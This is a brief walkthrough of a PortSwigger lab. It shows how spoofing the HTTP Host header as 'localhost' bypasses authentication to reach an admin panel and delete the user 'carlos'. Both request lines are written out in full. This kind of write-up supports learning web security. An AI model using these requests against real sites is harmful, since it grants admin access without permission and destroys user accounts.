# Host Header Authentication Bypass

This lab decides a user's privilege level based on the HTTP `Host` header.

**Goal:** Reach the admin panel and delete Carlos's account.

---

**Reference:**
- https://portswigger.net/web-security/host-header/exploiting

<img width="770" height="349" alt="1" src="https://github.com/user-attachments/assets/ad385765-7b9c-43c4-aea2-0553796b8b6d" />


---

Requesting `/admin` directly returns an error:

<img width="351" height="73" alt="2" src="https://github.com/user-attachments/assets/67bb8cd9-f7fc-43e0-a2d9-83d10d083d70" />


Setting the `Host` header to "localhost" grants access instead:

```
GET /admin HTTP/2
Host: localhost
...
```

<img width="709" height="543" alt="3" src="https://github.com/user-attachments/assets/1d329eaa-66a1-42ea-8ec2-8d5152639b88" />


The target user can then be deleted:

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
...
```

<img width="703" height="421" alt="4" src="https://github.com/user-attachments/assets/d3d542b4-9d61-4945-b487-9e43645d67f7" />

